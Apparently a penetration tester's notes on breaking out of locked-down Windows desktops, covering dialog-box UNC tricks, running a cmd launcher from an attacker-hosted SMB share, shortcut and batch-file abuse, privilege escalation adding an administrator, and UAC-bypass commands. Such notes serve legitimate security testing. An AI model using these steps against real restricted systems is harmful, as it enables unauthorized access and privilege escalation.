
Basically where you can't get hold of any sort of shell and all are disabled.

---
## Bypassing Path Restrictions

We can utilize windows dialog boxes to bypass the restrictions imposed.

Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an opportunity to invoke a Windows dialog box. We can get access to these using tools such as Paint, Wordpad, Notepad etc.

With the windows dialog box open, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan`, with File-Type set to `All Files`.

---
## Accessing SMB share from restricted environment

```sh
> smbserver.py -smb2support share $(pwd)
### Starting a smb server on attadck machine
```

Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Due to the presence of restrictions within the File Explorer, direct file copying is not viable but can run directly.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can compile this code above and run it directly to open a cmd.

---
## Alternate Explorer

File System Editors like `Q-Dir` or [Explorer++](https://explorerplusplus.com/) (runs wout install) can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy.

---
## Alternate Registry Editors

 [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy.

---
## Modify existing shortcut file

Within the target field in the properties, we can edit the shortcut to launch cmd with: `C:\Windows\System32\cmd.exe`. If a shortcut is not available we can transfer an existing shortcut using a SMB server. We can create a new shortcut file using PS, refer [[Malicious SCF and LNK Files]] under `Generating a Malicious .lnk File` .

---
## Script Execution

If Script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it allows us to drop a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place.

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.

---
## Escalating Privileges

Tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system. If [[Always Install Elevated]] is present, We can use `Write-UserAddMSI` and add a new Administrator.

---
## Bypassing UAC

[UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts.

```PowerShell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

---
## Additional resources worth checking:

- [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)

---